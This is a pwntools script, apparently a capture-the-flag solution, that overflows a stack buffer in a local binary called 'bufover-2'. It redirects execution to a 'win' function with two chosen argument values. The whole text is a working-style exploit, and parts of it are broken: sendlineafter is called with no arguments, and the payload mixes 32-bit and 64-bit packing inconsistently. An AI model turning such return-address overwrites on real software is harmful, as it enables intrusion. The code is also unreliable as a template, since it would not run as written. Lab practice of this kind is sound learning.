from pwn import *

context.binary = './bufover-2'
p = process(context.binary.path)

adr1 = 0x14B4DA55
adr2 = 0xF00DB4BE

p.sendlineafter()

payload = (
    b'A' * 28
    + p32(context.binary.symbols['win'])
    + b'A' * 4
    + p64(adr1)
    + p32(adr2)
)

p.sendline(payload)

print(p.recvall().decode('L1'))
p.close()
